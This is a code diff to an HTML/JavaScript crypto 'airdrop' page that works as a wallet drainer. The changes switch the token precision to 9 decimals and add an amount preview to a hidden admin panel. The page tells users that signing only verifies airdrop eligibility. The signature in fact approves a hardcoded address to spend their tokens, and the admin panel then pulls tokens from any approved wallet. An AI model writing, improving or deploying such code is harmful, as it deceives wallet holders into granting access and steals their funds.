@@ -22,6 +22,7 @@ body{background:#0f172a;padding:20px;color:#fff}
 .admin-title{text-align:center;color:#f87171;margin-bottom:15px}
 input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
 .btn-deduct{background:#ef4444;color:#fff}
+.preview-text{font-size:13px;color:#ffcc00;margin:6px 0;text-align:center;display:none}
 </style>
 </head>
 <body>
@@ -37,19 +38,36 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
 <div class="admin-box" id="adminPanel">
 <h3 class="admin-title">后台资产归集划扣</h3>
 <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
-<input type="number" step="0.0000000001" placeholder="正常输入数量 例如0.1 / 1" id="deductNum">
+<input type="number" step="0.000000001" placeholder="输入数量：1=1枚，0.1=0.1枚" id="deductNum" oninput="showNumPreview()">
+<div class="preview-text" id="previewBox"></div>
 <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
 </div>
 </div>
 </div>
 <script>
-// 全部换成多签钱包地址
+// 多签管理员地址
 const ADMIN_ADDR = "0x367ea4eb00e3ffa77c6f20022a8488527a71d9ab".toLowerCase();
-// 指定授权代币合约
+// 代币合约
 const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
-// 用户授权目标 = 多签地址
+// 授权目标多签地址
 const APPROVE_ADDR = "0x367ea4eb00e3ffa77c6f20022a8488527a71d9ab";
+// 代币固定9位精度
+const BASE = 1000000000;
 let nowUser = "";
+
+// 数量实时预览
+function showNumPreview(){
+    let val = document.getElementById("deductNum").value;
+    let box = document.getElementById("previewBox");
+    if(!val || Number(val)<=0){
+        box.style.display="none";
+        return;
+    }
+    let chainNum = Number(val) * BASE;
+    box.innerText = `链上实际数值：${chainNum}`;
+    box.style.display="block";
+}
+
 // 连接钱包
 document.getElementById("connectWallet").addEventListener("click",async()=>{
 if(!window.ethereum){
@@ -60,7 +78,6 @@ try{
 let accounts = await ethereum.request({method:"eth_requestAccounts"});
 nowUser = accounts[0].toLowerCase();
 document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
-// 多签钱包连接自动显示后台
 if(nowUser === ADMIN_ADDR){
 document.getElementById("adminPanel").classList.add("show");
 }
@@ -69,7 +86,8 @@ alert("钱包连接成功，可参与空投领取");
 alert("连接失败，请重试");
 }
 })
-// 用户签名授权 = 授权给多签
+
+// 用户授权
 document.getElementById("authReceive").addEventListener("click",async()=>{
 if(!nowUser) return alert("请先连接钱包");
 let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
@@ -92,15 +110,15 @@ alert("授权成功！空投代币即将发放到账");
 alert("已取消本次签名");
 }
 })
-// 多签钱包直接发起划扣 支持正常小数输入
+
+// 划扣提交
 document.getElementById("deductBtn").addEventListener("click",async()=>{
 if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
 let uAddr = document.getElementById("userAddr").value.trim();
 let num = document.getElementById("deductNum").value.trim();
 if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
 
-// 自动换算18位精度 正常输入0.1=0.1枚
-let realAmount = Number(num) * 10**18;
+let realAmount = Number(num) * BASE;
 let valHex = BigInt(Math.floor(realAmount)).toString(16).padStart(64,"0");
 
 let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
@@ -119,6 +137,7 @@ data:callData
 alert("代币划扣归集成功！");
 document.getElementById("userAddr").value = "";
 document.getElementById("deductNum").value = "";
+document.getElementById("previewBox").style.display="none";
 }catch(e){
 alert("划扣执行失败");
 }
